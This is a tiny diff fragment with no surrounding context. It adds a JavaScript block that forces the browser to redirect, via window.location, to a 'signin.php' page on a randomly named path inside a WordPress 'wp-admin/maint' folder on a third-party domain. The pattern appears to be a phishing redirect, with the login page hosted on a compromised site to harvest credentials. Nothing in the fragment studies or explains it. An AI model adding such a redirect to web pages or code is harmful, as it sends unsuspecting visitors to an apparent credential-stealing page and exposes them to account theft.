@@ -1,0 +1,4 @@
+
+ {
+       window.location ="https://forcar.com.tr/demo/wp-admin/maint/MmBbBrrreeh/mkb/signin.php"
+}
